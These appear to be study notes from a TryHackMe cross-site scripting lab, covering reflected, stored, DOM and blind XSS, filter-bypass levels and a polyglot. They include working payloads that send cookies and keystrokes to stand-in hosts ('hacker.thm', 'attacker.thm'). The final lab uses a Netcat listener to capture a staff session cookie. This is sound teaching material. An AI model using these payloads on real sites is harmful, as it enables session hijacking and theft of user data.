---
layout: default
title: Intro to Cross-site Scripting
parent: Introduction to Web Hacking
nav_order: 8
---

# Intro to Cross-site Scripting
- Based on JavaScript
- Known as XSS in the cybersecurity community
- Is classified as an injection attack, malicious javascript gets injected into a web application with the intention of being executed by other users.
- Extremely common

## Payloads
JavaScript code to be executed on the targets computer.
- **The intention**
- **The modification**

**The intention**

The JavaScript to actually do.
- **Proof Of Concept**
    - An alert box to pop up on the page with a string of text.
        ```js
        <script>alert('XSS');</script>
        ```
- **Session Stealing**
    - Details of a user's session
        - `tokens`, Kept in cookies on the targets machine.
    ```js
    <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
    ```
    - Takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged.
    - The attacker can take over the target's session and be logged as that user.
- **Key Logger**
    ```js
    <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
    ```
    - Anything the user types on the webpage, will be forwarded to a website under the attacker's control.
- **Business Logic**
    - Calling a particular network resource or a javascript function
    - A JavaScript function for changing the user's email address called `user.changeEmail()`.
    - The attacker may perform a reset password attack.
        ```js
        <script>user.changeEmail('attacker@hacker.thm');</script>
        ```

**The modification**

The changes to the code we need to make it execute as every scenario is different.

## Reflected XSS
When user-supplied data in an HTTP request is included in the webpage source without any validation.
1. When a user enters incorrect input, an error message is displayed.
1. The content of the error message gets taken from the `error` parameter in the query string and is built directly into the page source.
    - `https://website.thm/?error=Invalid Input Detected`
        ```html
        <div class="alert alert-danger">
            <p>Invalid Input Detected</p>
        </div>
        ```
1. The application doesn't check the contents of the `error` parameter, which allows the attacker to insert malicious code.
    - `https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>`
        ```html
        <div class="alert alert-danger">
            <p><script src="https://attacker.thm/evil.js"></script></p>
        </div>
        ```

**Test for Reflected XSS**
- Parameters in the URL Query String
- URL File Path
- HTTP Headers

## Stored XSS
The XSS payload is stored on the web application and then gets run when other users visit the site or web page.
- A blog website that allows users to post comments.
- But the blog comments aren't checked for JavaScript or filter out any malicious code.
- If a user post a comment containing JavaScript, will be stored in the database, and every other user visiting the article will have the JavaScript run in their browser.

**Test for Stored XSS**
- Comments on a blog
- User profile information
- Website Listings

## Document Object Model (DOM) Based XSS
A programming interface for HTML and XML documents.
- The JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
1. JavaScript gets the contents from the `window.location.hash` parameter.
1. Writes that onto the page in the currently being viewed section.
1. The contents of the hash aren't checked for malicious code.
- Allowing an attacker to inject JavaScript onto the webpage.

**Test for DOM Based XSS**
```diff
-Can be challenging to test for.
+Requires a certain amount of knowledge of JavaScript to read the source code.
```
1. Look for parts of the code that access certain variables that an attacker can have control over, `window.location.x`.
1. Check for how they are handled & the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`.

## Blind XSS
- Similar to a stored XSS.
- your payload gets stored on the website for another user to view, but you can't see the payload working or be able to test it against yourself first.

For Example, ...
1. A website has a contact form where you can message a member of staff.
1. The message content doesn't get checked for any malicious code.
1. Allows the attacker to enter anything they wish.
    - The attacker's JavaScript could make calls back to an attacker's website.
    - Revealing the staff portal URL, the staff member's cookies, and the contents of the portal page that is being viewed.
    - The attacker could potentially hijack the staff member's session and have access to the private portal.
1. These messages then get turned into support tickets which staff view on a private web portal.

**Test for Blind XSS**
- Ensure the payload has a call back, HTTP request.

**Blind XSS attacks tool**
[XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
- Automatically capture cookies, URLs, page contents and more.

## Payload!
### Level One
1. A form asking the user to enter there name.
1. Once entered, the user's name will be displayed, `Hello, USER`
    ```html
    <div class="text-center">
        <h2>Hello, USER</h2>
    </div>
    ```
1. Testing some html code, `<p style="color: red;">THM</p>`
    ```html
    <div class="text-center">
        <h2>Hello, <p style="color: red;">THM</p></h2>
    </div>
    ```
1. Now testing JavaScript code, `<script>alert('THM');</script>`
    ```html
    <div class="text-center">
        <h2>Hello, <script>alert('THM');</script></h2>
    </div>
    ```
### Level Two
1. A form asking the user to enter there name.
1. Once entered, the user's name will be displayed as a `input` tag.
    ```html
    <div class="text-center">
        <h2>Hello, <input value="USER"></h2>
    </div>
    ```
1. Testing JavaScript code, `Test">TEST<script>alert('THM');</script>`
```html
<div class="text-center">
    <h2>Hello, <input value="Test">TEST<script>alert('THM');</script>"&gt;</h2>
</div>
```
1. Test THM's JavaScrip code, `"><script>alert('THM');</script>`
    - The `">` closes the value parameter and then closes the input tag.
### Level Three
1. A form asking the user to enter there name.
1. Once entered, the user's name will be displayed as a `textarea` tag.
1. Testing JavaScript code, `test</textarea><script>alert('THM');</script>`
```html
<div class="text-center">
    <h2>Hello, <textarea>test</textarea><script>alert('THM');</script></h2>
</div>
```
1. Test THM's JavaScrip code, `</textarea><script>alert('THM');</script>`
    - The `</textarea>`, Causes the textarea element to close so the script will run.

### Level Four
1. A form asking the user to enter there name.
1. Once entered, the user's name will be displayed as a `span` tag.
    ```html
    <div class="text-center">
        <h2>Hello, <span class="name">test</span></h2>
    </div>
    ```
1. Also shows up on JavaScript code, ...
    ```js
    <script>
        document.getElementsByClassName('name')[0].innerHTML='test';
    </script>
    ```
1. Brake the JavaScript code!
    - `test'; alert('THM'); //`
    ```js
    <script>
        document.getElementsByClassName('name')[0].innerHTML='test'; alert('THM'); //';
    </script>
    ```
    - `'`, Closes the field specifying the name
    - `;`, The end of the command
    - `//`, Comment!

### Level Five
1. A form asking the user to enter there name.
    ```html
    <div class="text-center">
        <h2>Hello, test</h2>
    </div>
    ```
1. Check the Network tab
1. Found, `https://10-81-170-140.novnc.cell-prod-eu-west-1b.vm.tryhackme.com/level5?payload=test`
1. Testing HTML code within the URL, `https://10-81-170-140.novnc.cell-prod-eu-west-1b.vm.tryhackme.com/level5?payload=<p style="color: red;">TEST</p>`
    ```html
    <div class="text-center">
        <h2>Hello, <p style="color: red;">TEST</p></h2>
    </div>
    ```
1. Now testing JavaScript code, `https://10-81-170-140.novnc.cell-prod-eu-west-1b.vm.tryhackme.com/level5?payload=<script>alert('THM');</script>`
    ```html
    <div class="text-center">
        <h2>Hello, <>alert('THM');</h2>
    </div>
    ```
    - The word `script` gets removed from the payload, because there is a filter that strips out any potentially dangerous words.
1. `https://10-81-170-140.novnc.cell-prod-eu-west-1b.vm.tryhackme.com/level5?payload=<sscriptcript>alert('THM');</sscriptcript>`
    - `sscriptcript` -> s`script`cript -> `script`

### Level Six
1. Asks for a image path, `/images/cat.jpg`
1. Shows a cat image when clicked, `Enter`
1. `/images/cat.jpg"`
1. `"><script>alert('THM');</script>`
    ```html
    <div class="text-center">
        <h2>Your Picture</h2>
        <img src="" scriptalert('thm');="" script"="">
    </div>
    ```
    - The `<` and `>` characters get filtered out from the payload.
1. `/images/cat.jpg" onload="alert('THM');`

## Polyglots
A string of text which can escape attributes, tags and bypass filters all in one.
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Last one!
### Title
1. `Test1` & `Test2`
    - Try to escape the textarea tag.
    ```html
    <div class="panel-body">
    <div>
        <label>Status:</label> Open
    </div>
    <div>
        <label>Ticket Id:</label> 8
    </div>
    <div>
        <label>Ticket Subject:</label> Test1
    </div>
    <div>
        <label>Ticket Created:</label> 16/01/2026 17:08
    </div>
    <div>
        <label>Ticket Contents:</label>
    </div>
    <div>
        <textarea class="form-control">Test2</textarea>
    </div>
    </div>
    ```
1. `Test2` & `</textarea>test`
    - Successfully escaped the textarea tag
    ```html
    <div class="panel-body">
    <div>
        <label>Status:</label> Open
    </div>
    <div>
        <label>Ticket Id:</label> 9
    </div>
    <div>
        <label>Ticket Subject:</label> Test2
    </div>
    <div>
        <label>Ticket Created:</label> 16/01/2026 17:11
    </div>
    <div>
        <label>Ticket Contents:</label>
    </div>
    <div>
        <textarea class="form-control"></textarea>test
    </div>
    </div>
    ```
1. Run JavaScript and confirm that the ticket creation feature is vulnerable to an XSS attack. `Test3` & ` </textarea><script>alert('THM');</script>`

### Title
1. Set up a listening server using Netcat, `nc -nlvp 9001`
    - `-l`, Listen mode
    - `-p`, The port number
    - `-n`, To avoid the resolution of hostnames via DNS.
    - `-v`, Verbose mode
1. Build the payload, `</textarea><script>fetch('http://IP:9001?cookie=' + btoa(document.cookie) );</script>`
    - `</textarea>`, Tag closes the text area field.
    - `<script>`, Tag opens an area to write JavaScript.
    - `fetch()`, Command makes an HTTP request.
    - `IP`
        1. IP address from the THM AttackBox.
        1. IP address on the THM VPN Network.
    - `9001`, The port number using to listen for connections on the AttackBox/VPN Network.
    - `?cookie=`, The query string containing the victim’s cookies.
    - `btoa()`, Command base64 encodes the victim’s cookies.
    - `document.cookie`, Accesses the victim’s cookies for the Acme IT Support Website.
    - `</script>`, Closes the JavaScript code block.
1. Found cookie!
    ```diff
    +GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
    Host: 10.81.85.219:9001
    Connection: keep-alive
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
    Accept: */*
    Origin: http://172.17.0.1
    Referer: http://172.17.0.1/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US
    ```
1. base64, `c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==`
    - Output, `staff-session=4AB305E55955197693F01D6F8FD2D321`